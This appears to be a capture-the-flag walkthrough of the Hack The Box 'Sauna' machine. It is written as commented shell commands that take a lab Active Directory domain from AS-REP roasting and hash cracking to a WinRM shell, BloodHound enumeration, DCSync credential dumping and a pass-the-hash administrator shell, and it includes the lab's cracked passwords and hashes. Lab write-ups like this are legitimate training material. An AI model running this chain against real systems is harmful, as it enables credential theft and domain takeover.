# Sauna Room - Hack The Box - Linux

IP: `10.10.10.175`

```bash
# Connect to VPN
sudo -b openvpn competitive_PrettyPeace.ovpn
# Scan the machine
sudo nmap -v -sC -sV -oA nmap/sauna 10.10.10.175
# Enumerate SMB
crackmapexec smb 10.10.10.175
# domain:EGOTISTICAL-BANK.LOCAL
# Enumerate SMB shares
crackmapexec smb 10.10.10.175 --shares
# Enumerate SMB shares with no credentials (didn't work)
crackmapexec smb 10.10.10.175 --shares -u '' -p ''
# Enumerate SMB shares with smbmap (didn't work)
smbmap -H 10.10.10.175 -u '' -p ''
# Enumerate users with enum4linux (didn't work)
ldapsearch -x -s base namingcontexts 10.10.10.175

# Generate usernames from the website and save it to users.txt
# Enumerate users with kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute
./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt
# administrator FSmith are valid users

locate psexec.py
# /usr/share/doc/python3-impacket/examples/psexec.py

# Add to /etc/hosts 10.10.10.175 EGOTISTICAL-BANK.local sauna sauna.EGOTISTICAL-BANK.local

# Enumerate users with GetNPUsers.py (didn't work)
/usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/Administrator
# Enumerate users with GetNPUsers.py - worked. Hash saved to hashes/fsmith-domain-hash.txt
/usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/FSmith

# Crack the hash
# sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hashcat -m 18200 hashes/fsmith-domain-hash.txt /usr/share/wordlists/rockyou.txt --force
#fsmith:Thestrokes23

crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23
crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
#SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6                 We cant print money
searchsploit "ricoh" # local privesc maybe
# Check for winrm - worked
crackmapexec winrm 10.10.10.175 -u fsmith -p Thestrokes23
# WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

# Try with Evil-WinRM - worked - we got shell
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

# download WinPEAS - old version
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220328/winPEASx64.exe

# In the shell upload WinPEAS
upload winPEASx64.exe
.\winPEASx64.exe

# Tmux Scroll ctrl+b [ then use arrow keys
# Found a password EGOTISTICALBANK\svc_loanmanager Moneymakestheworldgoround!  

# In the remote shell view what the user svc_loanmanager can do
net user /domain svc_loanmgr
net user /domain FSmith
net user /domain HSmith
# Domain users

# Download and run neo4j, BloodHound and SharpHound
https://github.com/dimitar-grigorov/SoftUni-System-and-Network-Compromising?tab=readme-ov-file#tools-for-active-directory-enumeration


# Upload SharpHound in the remote shell
upload sharphound/SharpHound.exe
.\SharpHound.exe
download 20240309134949_BloodHound.zip
# Drag and drop the zip file to BloodHound
# Mark as owned FSmith and svc_loanmgr
# In tab Analysis select shortest path from Owned Principals for both users (found path only local DC)
# "Find Domain Admins" - only Administrator
# "Find shortest path to Domain Admins" - nothin useful

# "Find Principals with DCSync Rights" - found svc_loanmgr has DCSync rights
# Right click on line for svc_loanmgr and select "Help"
# Found that we can use mimikatz to get the password hash for the krbtgt user
# lsadump::dcsync /domain:testlab.local /user:Administrator

# run secretsdump.py using Moneymakestheworldgoround!
/usr/share/doc/python3-impacket/examples/secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175
# Dumped all hashes creds.txt. Admin Hash is 823452073d75b9d1cf70ebdf86c7f98e

# Use the hash to login with crackmapexec
crackmapexec smb 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
# SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)

# Use psexec.py to get shell and paste the hash
/usr/share/doc/python3-impacket/examples/psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e
# We got shell as administrator!
cd c:\Users\Administrator\Desktop
# Print the content of the root.txt file
type root.txt

cd c:\Users\FSmith\Desktop
# Print the content of the user.txt file
type user.txt 
```
